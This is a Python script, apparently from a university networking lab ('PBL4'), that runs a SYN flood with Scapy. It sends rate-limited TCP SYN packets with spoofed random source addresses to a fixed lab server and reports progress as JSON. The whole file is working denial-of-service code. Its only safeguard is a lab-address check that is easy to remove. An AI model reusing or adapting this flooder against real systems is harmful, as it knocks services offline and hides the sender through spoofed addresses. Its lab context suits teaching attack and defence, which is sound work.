#!/usr/bin/env python3
"""Existing SYN worker for the fixed PBL4 Docker lab; LAN support is pending."""

import argparse
import json
import signal
import time

from scapy.all import IP, TCP, Ether, RandIP, RandShort, getmacbyip, sendp


running = True


def emit(event_type, **values):
    print(json.dumps({"type": event_type, **values}, ensure_ascii=False), flush=True)


def stop_worker(_signum, _frame):
    global running
    running = False


def validate_lab(args):
    if args.server != "172.20.0.20":
        raise ValueError("Worker is restricted to the PBL4 lab addresses")
    if args.interface != "eth0":
        raise ValueError("Worker is restricted to eth0 inside hacker_node")
    if args.port not in (8080, 9000):
        raise ValueError("Port must be 8080 or 9000")
    if not 1 <= args.rate <= 1000:
        raise ValueError("Rate must be between 1 and 1000 packets per second")


def run_syn(args):
    server_mac = getmacbyip(args.server)
    if not server_mac:
        raise RuntimeError("Could not resolve Target Server MAC address")
    sent = 0
    last_report = time.monotonic()
    delay = 1 / args.rate
    emit("ready", message=f"[SYN-FLOOD] Worker ready at {args.rate} packets/s")
    while running:
        packet = IP(src=str(RandIP()), dst=args.server) / TCP(
            sport=RandShort(), dport=args.port, flags="S"
        )
        sendp(Ether(dst=server_mac) / packet, iface=args.interface, verbose=False)
        sent += 1
        now = time.monotonic()
        if now - last_report >= 1:
            emit("progress", sent=sent)
            last_report = now
        time.sleep(delay)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", required=True)
    parser.add_argument("--server", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--rate", type=int, default=100)
    args = parser.parse_args()
    validate_lab(args)

    signal.signal(signal.SIGTERM, stop_worker)
    signal.signal(signal.SIGINT, stop_worker)

    run_syn(args)


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        emit("error", message=str(error))
        raise
